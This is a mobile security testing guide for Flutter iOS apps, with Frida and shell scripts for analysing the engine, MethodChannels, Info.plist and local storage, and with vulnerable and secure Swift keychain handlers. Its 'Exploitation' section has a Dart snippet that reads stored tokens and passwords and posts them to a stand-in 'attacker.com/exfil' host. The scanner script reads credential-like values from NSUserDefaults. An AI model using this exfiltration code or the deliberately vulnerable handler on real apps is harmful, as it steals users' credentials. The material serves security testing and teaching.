# Flutter iOS Security

Flutter enables building iOS apps using Dart with a single codebase. However, the Dart compilation and Flutter framework introduce unique security considerations for iOS deployments.

## Architecture Overview

### Flutter iOS Compilation Pipeline

```
Dart Source Code
        ↓
   Dart AOT Compilation (ahead-of-time)
        ↓
   Dart Snapshot (binary format)
        ↓
    Flutter Engine (C++)
        ↓
   Flutter.framework (ARM64)
        ↓
   iOS Native Code
```

**MASTG References:**
- MASTG-TEST-0001: Information Gathering
- MASTG-TEST-0038: Local Data Storage Analysis
- MASTG-TEST-0045: WebView Communication
- MASTG-TEST-0052: Testing Inter-Process Communication

## 1. Engine Compilation (AOT)

### Flutter Release Mode

Flutter apps in release mode use **AOT (Ahead-of-Time) compilation**, which compiles Dart code to native ARM64 machine code:

```bash
# Check compilation mode of Flutter iOS app
strings Payload/*.app/Runner | grep -i "flutter\|dart"

# Look for AOT indicators
strings Payload/*.app/Runner | grep -E "kDart_IsolateSnapshotInstructions|kDartSnapshotInstructions"
```

### Detecting AOT Compilation

```javascript
// Frida script to detect Flutter AOT compilation
if (ObjC.available) {
    try {
        const FlutterEngine = ObjC.classes.FlutterEngine;

        if (FlutterEngine) {
            console.log("[+] Flutter Engine Detected");

            // Check for Dart runtime symbols
            const modules = Process.enumerateModules();
            const dartModule = modules.find(m => m.name.includes("Flutter") || m.name.includes("App"));

            if (dartModule) {
                const exports = dartModule.enumerateExports();
                const dartSymbols = exports.filter(e =>
                    e.name.includes("Dart_") ||
                    e.name.includes("dart_") ||
                    e.name.includes("kDart")
                );

                if (dartSymbols.length > 0) {
                    console.log(`[+] Found ${dartSymbols.length} Dart runtime symbols`);

                    // Check for AOT snapshot
                    const snapshotSymbols = exports.filter(e =>
                        e.name.includes("Snapshot") ||
                        e.name.includes("snapshot")
                    );

                    if (snapshotSymbols.length > 0) {
                        console.log("[+] AOT Snapshot Detected (Release Mode)");

                        // List snapshot symbols
                        snapshotSymbols.slice(0, 20).forEach(s => {
                            console.log(`    ${s.name} @ 0x${s.address.toString(16)}`);
                        });
                    }
                }
            }
        }
    } catch (e) {
        console.log("[-] Error detecting Flutter: " + e);
    }
}
```

### Flutter.framework Analysis

```bash
#!/bin/bash
# flutter_framework_analysis.sh

APP_PATH=$1

if [ -z "$APP_PATH" ]; then
    echo "Usage: $0 <app_path>"
    exit 1
fi

echo "[*] Analyzing Flutter.framework..."

FLUTTER_FRAMEWORK="$APP_PATH/Frameworks/Flutter.framework/Flutter"

if [ ! -f "$FLUTTER_FRAMEWORK" ]; then
    echo "[-] Flutter.framework not found"
    exit 1
fi

# Check Flutter version
echo "[*] Flutter Version:"
strings "$FLUTTER_FRAMEWORK" | grep -E "Flutter [0-9]+\.[0-9]+" | head -1

# Check engine version
echo "[*] Engine Version:"
strings "$FLUTTER_FRAMEWORK" | grep -E "engine-[0-9a-f]+" | head -1

# List exported symbols
echo "[*] Flutter Exported Symbols:"
nm "$FLUTTER_FRAMEWORK" | grep "T _Flutter" | head -20

# Check for debugging symbols
echo "[*] Debug Symbols:"
nm "$FLUTTER_FRAMEWORK" | grep -c "FlutterDebug" || echo "0"

# Check Dart VM exports
echo "[*] Dart VM Exports:"
nm "$FLUTTER_FRAMEWORK" | grep "Dart_" | head -20
```

## 2. MethodChannel iOS Implementation

### Architecture

```
Dart Code
    ↓
MethodChannel
    ↓
Flutter Engine (C++)
    ↓
FlutterMethodCodec
    ↓
FlutterViewController
    ↓
Native iOS (Objective-C/Swift)
```

### Detection of MethodChannel Usage

```javascript
// Frida script to enumerate MethodChannels
setTimeout(() => {
    try {
        const FlutterViewController = ObjC.classes.FlutterViewController;

        if (FlutterViewController) {
            console.log("[+] FlutterViewController Found");

            // Hook MethodChannel creation
            const FlutterMethodChannel = ObjC.classes.FlutterMethodChannel;

            if (FlutterMethodChannel) {
                const channelWithName = FlutterMethodChannel['- channelWithName:binaryMessenger:codec:'];
                Interceptor.attach(channelWithName.implementation, {
                    onEnter: function(args) {
                        const channelName = new ObjC.Object(args[2]).toString();
                        this.channelName = channelName;

                        console.log(`[+] MethodChannel Created: ${channelName}`);
                    },
                    onLeave: function(retval) {
                        if (!retval.isNull()) {
                            const channel = new ObjC.Object(retval);

                            // Try to get handler
                            try {
                                const handler = channel['- methodCallHandler']();
                                if (!handler.isNull()) {
                                    console.log(`    Handler: ${handler.$className}`);

                                    // Set up monitoring
                                    this.monitorChannel(retval, this.channelName);
                                }
                            } catch (e) {
                                // Handler might not be set yet
                            }
                        }
                    }
                });

                console.log("[+] MethodChannel hooks installed");
            }
        }
    } catch (e) {
        console.log("[-] Error hooking MethodChannel: " + e);
    }
}, 2000);

// Monitor channel function for the interceptor
function monitorChannel(channelPtr, channelName) {
    const channel = new ObjC.Object(channelPtr);
    const setHandler = channel['- setMethodCallHandler:'];

    Interceptor.attach(setHandler.implementation, {
        onEnter: function(args) {
            if (!args[2].isNull()) {
                const handler = new ObjC.Object(args[2]);
                console.log(`[+] Handler Set for Channel: ${channelName}`);
                console.log(`    Handler Type: ${handler.$className}`);

                // Hook the handler's method
                try {
                    const handleMethodCall = handler['- handleMethodCall:result:'];
                    Interceptor.attach(handleMethodCall.implementation, {
                        onEnter: function(args) {
                            const call = new ObjC.Object(args[2]);
                            const method = call['- method']().toString();
                            const arguments_ = call['- arguments']();

                            console.log(`\n[+] MethodChannel Call: ${channelName}`);
                            console.log(`    Method: ${method}`);
                            console.log(`    Arguments: ${arguments_}`);

                            // Check for sensitive method names
                            const sensitive = ['login', 'auth', 'password', 'token', 'decrypt', 'key'];
                            if (sensitive.some(s => method.toLowerCase().includes(s))) {
                                console.log(`    [!] SENSITIVE METHOD CALLED`);
                            }
                        }
                    });
                } catch (e) {
                    // Handle method might not exist
                }
            }
        }
    });
}
```

### Vulnerable MethodChannel Implementation

```swift
// Vulnerable native MethodChannel handler
// AppDelegate.swift (iOS)

import Flutter
import Security

@UIApplicationMain
@objc class AppDelegate: FlutterAppDelegate {
    override func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
    ) -> Bool {

        let controller = window?.rootViewController as? FlutterViewController
        let keychainChannel = FlutterMethodChannel(
            name: "com.example.app.keychain",
            binaryMessenger: controller!.binaryMessenger
        )

        // VULNERABLE: Exposes Keychain operations without validation
        keychainChannel.setMethodCallHandler { [weak self] (call, result) in
            switch call.method {
            case "saveItem":
                // No input validation
                guard let args = call.arguments as? [String: Any],
                      let key = args["key"] as? String,
                      let value = args["value"] as? String else {
                    result(FlutterError(code: "INVALID_ARGS", message: "Invalid arguments", details: nil))
                    return
                }

                // Direct Keychain access - vulnerable to injection
                let query: [String: Any] = [
                    kSecClass as String: kSecClassGenericPassword,
                    kSecAttrAccount as String: key,
                    kSecValueData as String: value.data(using: .utf8)!
                ]

                let status = SecItemAdd(query as CFDictionary, nil)
                if status == errSecSuccess {
                    result(true)
                } else {
                    result(FlutterError(code: "KEYCHAIN_ERROR", message: "Failed to save", details: nil))
                }

            case "getItem":
                guard let args = call.arguments as? [String: Any],
                      let key = args["key"] as? String else {
                    result(FlutterError(code: "INVALID_ARGS", message: "Invalid arguments", details: nil))
                    return
                }

                let query: [String: Any] = [
                    kSecClass as String: kSecClassGenericPassword,
                    kSecAttrAccount as String: key,
                    kSecReturnData as String: true
                ]

                var resultData: AnyObject?
                let status = SecItemCopyMatching(query as CFDictionary, &resultData)

                if status == errSecSuccess, let data = resultData as? Data {
                    let value = String(data: data, encoding: .utf8)
                    result(value)
                } else {
                    result("")
                }

            default:
                result(FlutterMethodNotImplemented)
            }
        }

        GeneratedPluginRegistrant.register(with: self)
        return super.application(application, didFinishLaunchingWithOptions: launchOptions)
    }
}
```

### Exploitation

```dart
// Dart code to exploit vulnerable MethodChannel
import 'package:flutter/services.dart';

const keychainChannel = MethodChannel('com.example.app.keychain');

// Steal all credentials
Future<void> exploitKeychain() async {
  final keys = ['auth_token', 'api_key', 'password', 'session'];

  for (final key in keys) {
    try {
      final value = await keychainChannel.invokeMethod('getItem', {'key': key});

      if (value != null && value.isNotEmpty) {
        // Exfiltrate to attacker server
        await http.post(
          Uri.parse('https://attacker.com/exfil'),
          body: jsonEncode({'key': key, 'value': value}),
        );
      }
    } catch (e) {
      // Key might not exist
    }
  }
}
```

### Secure Implementation

```swift
// Secure MethodChannel handler
import Flutter
import Security
import CryptoKit

@UIApplicationMain
@objc class AppDelegate: FlutterAppDelegate {
    override func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
    ) -> Bool {

        let controller = window?.rootViewController as? FlutterViewController
        let keychainChannel = FlutterMethodChannel(
            name: "com.example.app.keychain",
            binaryMessenger: controller!.binaryMessenger
        )

        // Validate caller legitimacy
        keychainChannel.setMethodCallHandler { [weak self] (call, result) in
            // Validate method name
            guard ["saveItem", "getItem", "deleteItem"].contains(call.method) else {
                result(FlutterMethodNotImplemented)
                return
            }

            guard let args = call.arguments as? [String: Any],
                  let key = args["key"] as? String else {
                result(FlutterError(code: "INVALID_ARGS", message: "Key is required", details: nil))
                return
            }

            // Sanitize key to prevent injection
            guard isValidKeychainKey(key) else {
                result(FlutterError(code: "INVALID_KEY", message: "Invalid key format", details: nil))
                return
            }

            switch call.method {
            case "saveItem":
                guard let value = args["value"] as? String, !value.isEmpty else {
                    result(FlutterError(code: "INVALID_VALUE", message: "Value is required", details: nil))
                    return
                }

                // Enforce kSecAttrAccessibleWhenUnlocked
                let query: [String: Any] = [
                    kSecClass as String: kSecClassGenericPassword,
                    kSecAttrAccount as String: key,
                    kSecValueData as String: value.data(using: .utf8)!,
                    kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlocked
                ]

                let status = SecItemAdd(query as CFDictionary, nil)
                if status == errSecSuccess || status == errSecDuplicateItem {
                    result(true)
                } else {
                    result(FlutterError(code: "KEYCHAIN_ERROR", message: "Failed to save: \(status)", details: nil))
                }

            case "getItem":
                let query: [String: Any] = [
                    kSecClass as String: kSecClassGenericPassword,
                    kSecAttrAccount as String: key,
                    kSecReturnData as String: true
                ]

                var resultData: AnyObject?
                let status = SecItemCopyMatching(query as CFDictionary, &resultData)

                if status == errSecSuccess, let data = resultData as? Data {
                    let value = String(data: data, encoding: .utf8)
                    result(value)
                } else {
                    result(nil)
                }

            default:
                result(FlutterMethodNotImplemented)
            }
        }

        GeneratedPluginRegistrant.register(with: self)
        return super.application(application, didFinishLaunchingWithOptions: launchOptions)
    }

    private func isValidKeychainKey(_ key: String) -> Bool {
        // Only allow alphanumeric and underscore
        let regex = "^[a-zA-Z0-9_]{1,100}$"
        return NSPredicate(format: "SELF MATCHES %@", regex).evaluate(with: key)
    }
}
```

## 3. ios/Runner/ Structure

### Typical Flutter iOS Project Structure

```
ios/
├── Runner/
│   ├── AppDelegate.swift
│   ├── Info.plist
│   ├── Assets.xcassets/
│   ├── Base.lproj/
│   ├── GoogleService-Info.plist
│   └── Runner-Bridging-Header.h
├── Runner.xcodeproj/
├── Runner.xcworkspace/
└── Podfile
```

### Info.plist Flutter Entries

```xml
<!-- Flutter-specific Info.plist entries -->
<key>CFBundleIdentifier</key>
<string>com.example.app</string>

<!-- Flutter engine configuration -->
<key>FLTEnableImpeller</key>
<false/>

<!-- Flutter app name -->
<key>CFBundleName</key>
<string>My Flutter App</string>

<!-- Flutter version -->
<key>FLTVersion</key>
<string>3.16.0</string>

<!-- App Transport Security -->
<key>NSAppTransportSecurity</key>
<dict>
    <!-- VULNERABLE: Allows arbitrary loads -->
    <key>NSAllowsArbitraryLoads</key>
    <true/>

    <!-- More secure configuration -->
    <key>NSExceptionDomains</key>
    <dict>
        <key>api.example.com</key>
        <dict>
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <false/>
            <key>NSIncludesSubdomains</key>
            <true/>
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.2</string>
        </dict>
    </dict>
</dict>

<!-- URL Schemes -->
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>myapp</string>
        </array>
    </dict>
</array>

<!-- Background modes -->
<key>UIBackgroundModes</key>
<array>
    <string>fetch</string>
    <string>remote-notification</string>
</array>

<!-- Privacy descriptions -->
<key>NSCameraUsageDescription</key>
<string>Camera access for scanning documents</string>

<key>NSPhotoLibraryUsageDescription</key>
<string>Photo library access for selecting images</string>

<!-- Local Network usage -->
<key>NSLocalNetworkUsageDescription</key>
<string>Local network access for printer discovery</string>

<key>NSBonjourServices</key>
<array>
    <string>_printer._tcp</string>
</array>
```

### Security Audit of Info.plist

```bash
#!/bin/bash
# audit_flutter_info_plist.sh

INFO_PLIST=$1

if [ -z "$INFO_PLIST" ]; then
    echo "Usage: $0 <Info.plist_path>"
    exit 1
fi

echo "[*] Auditing Flutter Info.plist..."

# Check for NSAllowsArbitraryLoads
if plutil -p "$INFO_PLIST" | grep -q "NSAllowsArbitraryLoads.*true"; then
    echo "[!] CRITICAL: NSAllowsArbitraryLoads is enabled - ATS bypass possible"
else
    echo "[+] ATS is properly configured"
fi

# Check for insecure exceptions
if plutil -p "$INFO_PLIST" | grep -q "NSExceptionAllowsInsecureHTTPLoads.*true"; then
    echo "[!] WARNING: Insecure HTTP loads allowed for some domains"
    plutil -p "$INFO_PLIST" | grep -B5 "NSExceptionAllowsInsecureHTTPLoads"
fi

# Check URL schemes
echo "[*] Custom URL Schemes:"
plutil -p "$INFO_PLIST" | grep -A3 "CFBundleURLSchemes" | grep "string" || echo "  None found"

# Check background modes
echo "[*] Background Modes:"
plutil -p "$INFO_PLIST" | grep -A10 "UIBackgroundModes" | grep "string" || echo "  None found"

# Check for embedded frameworks
echo "[*] Embedded Frameworks:"
if [ -d "$(dirname "$INFO_PLIST")/Frameworks" ]; then
    ls "$(dirname "$INFO_PLIST")/Frameworks"
else
    echo "  None found"
fi

# Check for embedded dylibs
echo "[*] Embedded Dynamic Libraries:"
if [ -d "$(dirname "$INFO_PLIST")/Frameworks" ]; then
    find "$(dirname "$INFO_PLIST")/Frameworks" -name "*.dylib"
else
    echo "  None found"
fi
```

## 4. Dart Snapshot Analysis

### Extracting Dart Snapshot

```bash
#!/bin/bash
# extract_dart_snapshot.sh

APP_PATH=$1

if [ -z "$APP_PATH" ]; then
    echo "Usage: $0 <app_path>"
    exit 1
fi

echo "[*] Extracting Dart Snapshot..."

# Find app.framework (contains Dart snapshot)
APP_FRAMEWORK="$APP_PATH/Frameworks/App.framework"

if [ -d "$APP_FRAMEWORK" ]; then
    echo "[+] Found App.framework"

    # The Dart snapshot is usually in the binary
    APP_BINARY="$APP_FRAMEWORK/App"

    if [ -f "$APP_BINARY" ]; then
        echo "[+] Found App binary"

        # Extract snapshot (usually starts with "Snapshot" magic)
        # The snapshot is embedded in the binary

        # Use strings to find snapshot markers
        echo "[*] Searching for snapshot markers..."
        strings "$APP_BINARY" | grep -E "Dart_Snapshot|kDartIsolateSnapshot" | head -10

        # Try to extract using flutter tools
        if command -v flutter &> /dev/null; then
            echo "[*] Attempting to parse snapshot with flutter..."
            # This would require flutter toolchain
        fi
    fi
fi

# Alternative: Check for separate snapshot files
SNAPSHOT_FILES=$(find "$APP_PATH" -name "*.snapshot" -o -name "snapshot.dill" -o -name "kernel_blob.bin")

if [ -n "$SNAPSHOT_FILES" ]; then
    echo "[+] Found snapshot files:"
    echo "$SNAPSHOT_FILES"
fi

# Search for embedded snapshot in Flutter.framework
FLUTTER_FRAMEWORK="$APP_PATH/Frameworks/Flutter.framework"

if [ -f "$FLUTTER_FRAMEWORK/Flutter" ]; then
    echo "[*] Checking Flutter.framework for snapshot..."

    # Look for snapshot markers
    strings "$FLUTTER_FRAMEWORK/Flutter" | grep -E "Dart_Snapshot|kDart" | head -10
fi
```

### Analyzing Dart Snapshot

```javascript
// Frida script to analyze Dart snapshot
setTimeout(() => {
    try {
        // Look for Dart runtime
        const Dart_Isolate = Module.findGlobalExportByName('Dart_Isolate');

        if (Dart_Isolate) {
            console.log("[+] Dart Runtime Detected");

            // Enumerate Dart exports
            const modules = Process.enumerateModules();
            const dartExports = [];

            modules.forEach(mod => {
                const exports = mod.enumerateExports();
                exports.forEach(exp => {
                    if (exp.name.startsWith('Dart_') || exp.name.startsWith('dart_')) {
                        dartExports.push({
                            module: mod.name,
                            name: exp.name,
                            address: exp.address
                        });
                    }
                });
            });

            console.log(`[+] Found ${dartExports.length} Dart exports`);

            // Look for snapshot-related symbols
            const snapshotExports = dartExports.filter(e =>
                e.name.includes('Snapshot') || e.name.includes('snapshot')
            );

            console.log(`[+] Snapshot-related symbols: ${snapshotExports.length}`);
            snapshotExports.slice(0, 20).forEach(e => {
                console.log(`    ${e.name} @ 0x${e.address.toString(16)}`);
            });

            // Try to locate isolate data
            try {
                const Dart_CurrentIsolate = Module.findGlobalExportByName('Dart_CurrentIsolate');
                if (Dart_CurrentIsolate) {
                    const isolate = new NativeFunction(Dart_CurrentIsolate, 'pointer', []);
                    const currentIsolate = isolate();

                    if (currentIsolate && !currentIsolate.isNull()) {
                        console.log("[+] Current Isolate: 0x" + currentIsolate.toString(16));
                    }
                }
            } catch (e) {
                console.log("[-] Could not get current isolate: " + e);
            }
        }
    } catch (e) {
        console.log("[-] Error analyzing Dart snapshot: " + e);
    }
}, 2000);
```

## 5. Flutter Security Testing with Frida

### Comprehensive Flutter Security Scanner

```javascript
// Flutter iOS Security Scanner
// Usage: frida -U -f com.example.app -l flutter_security_scanner.js (removed in Frida 17; omit for auto-resume)

console.log("[*] Flutter iOS Security Scanner");
console.log("[*] Version: 1.0");
console.log("");

// 1. Detect Flutter Engine
setTimeout(() => {
    console.log("[1] Flutter Engine Detection");

    try {
        const FlutterEngine = ObjC.classes.FlutterEngine;

        if (FlutterEngine) {
            console.log("    [+] Flutter Engine: Detected");

            // Get Flutter version
            try {
                const FlutterVersion = ObjC.classes.FlutterVersion;
                if (FlutterVersion) {
                    const version = FlutterVersion['- version']().toString();
                    console.log(`    [+] Flutter Version: ${version}`);
                }
            } catch (e) {}

            // Check for Impeller rendering
            try {
                const impeller = ObjC.classes.IMPeller;
                if (impeller) {
                    console.log("    [+] Impeller Rendering: Enabled");
                } else {
                    console.log("    [-] Impeller Rendering: Disabled");
                }
            } catch (e) {}
        } else {
            console.log("    [-] Flutter Engine: Not detected");
        }
    } catch (e) {
        console.log("    [-] Error detecting Flutter: " + e);
    }

    console.log("");
}, 500);

// 2. Enumerate MethodChannels
setTimeout(() => {
    console.log("[2] MethodChannel Enumeration");

    try {
        const FlutterMethodChannel = ObjC.classes.FlutterMethodChannel;

        if (FlutterMethodChannel) {
            const channels = new Set();

            // Hook channel creation
            const channelWithName = FlutterMethodChannel['- channelWithName:binaryMessenger:codec:'];
            Interceptor.attach(channelWithName.implementation, {
                onEnter: function(args) {
                    const channelName = new ObjC.Object(args[2]).toString();
                    channels.add(channelName);
                    console.log(`    [+] MethodChannel: ${channelName}`);
                }
            });

            console.log(`    [*] Monitoring for MethodChannel creation...`);
            console.log(`    [*] Found ${channels.size} channels so far`);
        } else {
            console.log("    [-] FlutterMethodChannel not available");
        }
    } catch (e) {
        console.log("    [-] Error: " + e);
    }

    console.log("");
}, 1500);

// 3. Check for SSL Pinning
setTimeout(() => {
    console.log("[3] SSL Pinning Check");

    // Check for flutter_custom_http_client plugin
    const modules = Process.enumerateModules();
    const sslPinningModules = modules.filter(m =>
        m.name.toLowerCase().includes('ssl') ||
        m.name.toLowerCase().includes('pinning') ||
        m.name.toLowerCase().includes('certificate')
    );

    if (sslPinningModules.length > 0) {
        console.log("    [+] SSL Pinning Modules Found:");
        sslPinningModules.forEach(m => {
            console.log(`        - ${m.name}`);
        });
    } else {
        console.log("    [-] No SSL Pinning modules detected");
    }

    // Check for flutter_custom_http_client
    const strings = modules[0].enumerateSymbols();
    const pinningStrings = strings.filter(s =>
        s.name.includes('pinning') ||
        s.name.includes('certificate') ||
        s.name.includes('trust_manager')
    );

    if (pinningStrings.length > 0) {
        console.log(`    [+] Found ${pinningStrings.length} pinning-related symbols`);
    }

    console.log("");
}, 2500);

// 4. Check for Local Storage
setTimeout(() => {
    console.log("[4] Local Storage Analysis");

    try {
        const NSUserDefaults = ObjC.classes.NSUserDefaults;
        const standardUserDefaults = NSUserDefaults.standardUserDefaults();

        // Check for shared_preferences usage
        const sharedPrefsKeys = [
            'flutter.', 'Flutter.', 'SharedPreferences.'
        ];

        const allKeys = standardUserDefaults['- dictionaryRepresentation']();
        const keys = allKeys['- allKeys']();

        console.log(`    [*] Total keys in NSUserDefaults: ${keys.count()}`);

        let flutterKeys = 0;
        for (let i = 0; i < keys.count(); i++) {
            const key = keys.objectAtIndex_(i).toString();
            if (sharedPrefsKeys.some(prefix => key.startsWith(prefix))) {
                flutterKeys++;
            }
        }

        console.log(`    [+] Flutter-related keys: ${flutterKeys}`);

        // Check for sensitive keys
        const sensitivePatterns = ['token', 'password', 'api', 'secret', 'credential', 'auth'];
        const sensitiveKeys = [];

        for (let i = 0; i < keys.count(); i++) {
            const key = keys.objectAtIndex_(i).toString();
            if (sensitivePatterns.some(p => key.toLowerCase().includes(p))) {
                const value = standardUserDefaults['- objectForKey:'](key);
                sensitiveKeys.push({ key, value: value.toString() });
            }
        }

        if (sensitiveKeys.length > 0) {
            console.log(`    [!] Found ${sensitiveKeys.length} potentially sensitive keys:`);
            sensitiveKeys.slice(0, 10).forEach(k => {
                console.log(`        - ${k.key}`);
            });
        } else {
            console.log("    [-] No sensitive keys detected");
        }
    } catch (e) {
        console.log("    [-] Error analyzing storage: " + e);
    }

    console.log("");
}, 3500);

// 5. Check for URL Schemes
setTimeout(() => {
    console.log("[5] URL Scheme Analysis");

    try {
        const mainBundle = ObjC.classes.NSBundle.mainBundle();
        const urlTypes = mainBundle['- objectForInfoDictionaryKey:']('CFBundleURLTypes');

        if (!urlTypes.isNull()) {
            const schemes = [];

            for (let i = 0; i < urlTypes.count(); i++) {
                const urlType = urlTypes.objectAtIndex_(i);
                const schemeArray = urlType['- objectForKey:']('CFBundleURLSchemes');

                for (let j = 0; j < schemeArray.count(); j++) {
                    schemes.push(schemeArray.objectAtIndex_(j).toString());
                }
            }

            console.log(`    [+] Found ${schemes.length} URL schemes:`);
            schemes.forEach(s => console.log(`        - ${s}`));

            // Check for dangerous schemes
            const dangerous = schemes.filter(s =>
                s.toLowerCase().includes('auth') ||
                s.toLowerCase().includes('callback') ||
                s.toLowerCase().includes('token')
            );

            if (dangerous.length > 0) {
                console.log(`    [!] Potentially dangerous schemes:`);
                dangerous.forEach(s => console.log(`        - ${s}`));
            }
        } else {
            console.log("    [-] No URL schemes defined");
        }
    } catch (e) {
        console.log("    [-] Error analyzing URL schemes: " + e);
    }

    console.log("");
}, 4500);

// 6. Final summary
setTimeout(() => {
    console.log("[*] Flutter iOS Security Scan Complete");
    console.log("[*] Review the findings above for security issues");
}, 5500);
```

## Testing Checklist

### Flutter Engine and Compilation
- [ ] Detect Flutter version and compilation mode (AOT/JIT)
- [ ] Analyze Flutter.framework exports
- [ ] Check for Impeller rendering
- [ ] Verify Dart runtime symbols

### MethodChannel Security
- [ ] Enumerate all MethodChannels
- [ ] Monitor MethodChannel calls
- [ ] Test input validation in native handlers
- [ ] Check for sensitive data in calls
- [ ] Verify error handling and sanitization

### Local Storage
- [ ] Analyze NSUserDefaults for Flutter keys
- [ ] Check for sensitive data in storage
- [ ] Verify encryption of stored values
- [ ] Review shared_preferences usage

### Network Security
- [ ] Detect SSL pinning implementation
- [ ] Check for custom HTTP client plugins
- [ ] Test SSL pinning bypass
- [ ] Verify ATS configuration

### Bundle Analysis
- [ ] Extract and analyze Info.plist
- [ ] Check URL schemes
- [ ] Review background modes
- [ ] Verify embedded frameworks

### Snapshot Analysis
- [ ] Extract Dart snapshot if possible
- [ ] Analyze snapshot for sensitive data
- [ ] Search for embedded secrets
- [ ] Check for debug symbols

## OWASP MASTG References

- **MASTG-TEST-0001**: Information Gathering
- **MASTG-TEST-0038**: Local Data Storage Analysis
- **MASTG-TEST-0045**: WebView Communication
- **MASTG-TEST-0046**: Testing for Local Storage
- **MASTG-TEST-0050**: Testing Network Communication
- **MASTG-TEST-0051**: Testing Endpoint Transport Security
- **MASTG-TEST-0052**: Testing Inter-Process Communication
- **MASTG-TEST-0053**: Testing for Custom URL Schemes
- **MASTG-TEST-0083**: Testing Binary Protection
- **MASTG-TEST-0084**: Testing the Binary (iOS)

## Tools and Resources

### Analysis Tools
- **Frida**: Runtime instrumentation
- **objection**: Runtime exploration
- **flutter tools**: Dart snapshot analysis
- **MobSF**: Automated security testing
- **IDA Pro**: Binary analysis

### Reference Materials
- [Flutter Security Best Practices](https://docs.flutter.dev/security)
- [OWASP MASTG](https://github.com/OWASP/MASTG)
- [Flutter Inter-Platform Communication](https://docs.flutter.dev/platform-integration/platform-channels)
- [Flutter for iOS](https://docs.flutter.dev/ios)
